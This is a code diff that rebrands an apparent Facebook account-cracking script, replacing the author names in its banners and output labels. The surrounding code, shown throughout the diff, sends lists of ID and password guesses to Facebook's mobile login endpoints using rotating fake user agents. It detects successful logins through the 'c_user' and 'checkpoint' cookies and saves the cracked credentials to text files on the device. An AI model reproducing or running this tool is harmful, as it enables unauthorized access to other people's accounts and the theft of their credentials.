@@ -43,7 +43,7 @@ try:
 except ModuleNotFoundError: 
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python hi.py')
+	os.system('python SHAHBAZ.py')
 ugen = []
 for xd in range(5000):
 	aa='Mozilla/5.0 (Linux; U; Android'
@@ -167,20 +167,19 @@ syed =[
 'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T280) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36',
 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',]
-
 logo=("""\033[1;97m
-   _    _       __  __ ______         
- | |  | |     |  \/  |___  /   /\    
- | |__| | __ _| \  / |  / /   /  \   
- |  __  |/ _` | |\/| | / /   / /\ \  
- | |  | | (_| | |  | |/ /__ / ____ \ 
- |_|  |_|\__,_|_|  |_/_____/_/    \_\
-                                           
+  ______      _____  _____         _      
+ |  ____/\   |_   _|/ ____|  /\   | |     
+ | |__ /  \    | | | (___   /  \  | |     
+ |  __/ /\ \   | |  \___ \ / /\ \ | |     
+ | | / ____ \ _| |_ ____) / ____ \| |____ 
+ |_|/_/    \_\_____|_____/_/    \_\______|
+                        
 --------------------------------------------------
->>  Owner    : ITX HAMZA
->>  Facebook : HAMZA SAMAD
->>  Version  : 0.1
->>  Team❤    : FREE
+>>  Owner    : ITX FAISAL
+>>  Facebook : FAISL ALI
+>>  Version  : 0.3
+>>  Team❤    : ZERO
 --------------------------------------------------""")
 def linex():
 	print('\033[1;37m--------------------------------------------------')
@@ -194,7 +193,7 @@ pcp=[]
 id=[]
 def fia():    
 			print(logo)
-			print('\x1b[1;91m>>> hamza TEAM  VERSION :\x1b[1;92m 1.1 ')
+			print('\x1b[1;91m>>> FAISAL TEAM  VERSION :\x1b[1;92m 1.1 ')
 			linex()
 			print('[1] Crack File Clone\n[2] Crack Pak Random Clone\n[0] Exit')
 			linex()
@@ -202,7 +201,7 @@ def fia():
 			if xd in ['1','01']:
 				os.system('clear')
 				print(logo)
-				print('Example : /sdcard/hamza.txt')
+				print('Example : /sdcard/FAISAL.txt')
 				linex()
 				file = input(' Put file path\033[1;37m: ')
 				try:
@@ -258,7 +257,7 @@ def fia():
 				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 				linex()
 				input(' Press enter to back ')
-				os.system('python hi.py')
+				os.system('python FAISAL.py')
 			elif xd in ['2','02']:
 				menu()
 			elif xd in ['3','03']:
@@ -272,7 +271,7 @@ def fia():
 		
 def mmm(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m[HAMZA / SAMAD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m[FAISAL / NAZIR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -293,16 +292,16 @@ def mmm(ids,names,passlist):
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 			SHAHBAZ=session.cookies.get_dict().keys()
 			if "c_user" in SHAHBAZ:
-				print('\r\r\033[1;31m[HAMZA-CP] %s | %s'%(ids,pas))
+				print('\r\r\033[1;31m[HI-CP] %s | %s'%(ids,pas))
 				
-				open('/sdcard/HAMZA-CP.txt', 'a').write(ids+'|'+pas+'\n')
+				open('/sdcard/HI-CP.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in SHAHBAZ:
 				if 'y' in pcp:
-					print('\r\r\x1b[1;92m[HAMZA-OK] '+ids+' | '+pas+'\033[1;97m')
+					print('\r\r\x1b[1;92m[HI-OK] '+ids+' | '+pas+'\033[1;97m')
 					
-					open('/sdcard/HAMZA-OK.txt', 'a').write(ids+'|'+pas+'\n')
+					open('/sdcard/HI-OK.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -314,7 +313,7 @@ def mmm(ids,names,passlist):
 	loop+=1
 def ffb(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m[HAMZA / SAMAD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;37m[FAISAL / NAZIR] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -336,16 +335,16 @@ def ffb(ids,names,passlist):
 			if "c_user" in SHAHBAZ:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m[HAMZA-OK] %s | %s'%(ids,pas))
+				print('\r\r\033[1;32m[HI-OK] %s | %s'%(ids,pas))
 				
-				open('/sdcard/HAMZA-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				open('/sdcard/HI-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in SHAHBAZ:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;208m[HAMZA-CP] '+ids+' | '+pas+'\033[1;97m')
+					print('\r\r\x1b[38;5;208m[HI-CP] '+ids+' | '+pas+'\033[1;97m')
 					
-					open('/sdcard/HAMZA-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					open('/sdcard/HI-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -514,7 +513,7 @@ def fcrack(uid,pwx,tl):
 	try:
 		for ps in pwx:
 			session = requests.Session()
-			sys.stdout.write(f'\r [\033[1;97mHAMZA / SAMAD\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
+			sys.stdout.write(f'\r [\033[1;97mFAISAL / NAZIR\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
 			sys.stdout.flush()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -542,21 +541,22 @@ def fcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',}
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
+}
 			lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\33[38;5;208m[HAMZA-CP] '+cid+' | '+ps+'\033[1;32m')
+				print('\33[38;5;208m[HI-CP] '+cid+' | '+ps+'\033[1;32m')
 				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
-				print('\x1b[1;92m[HAMZA-OK] '+cid+' | '+ps+'\33[0;97m')
+				print('\x1b[1;92m[HI-OK] '+cid+' | '+ps+'\33[0;97m')
 				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
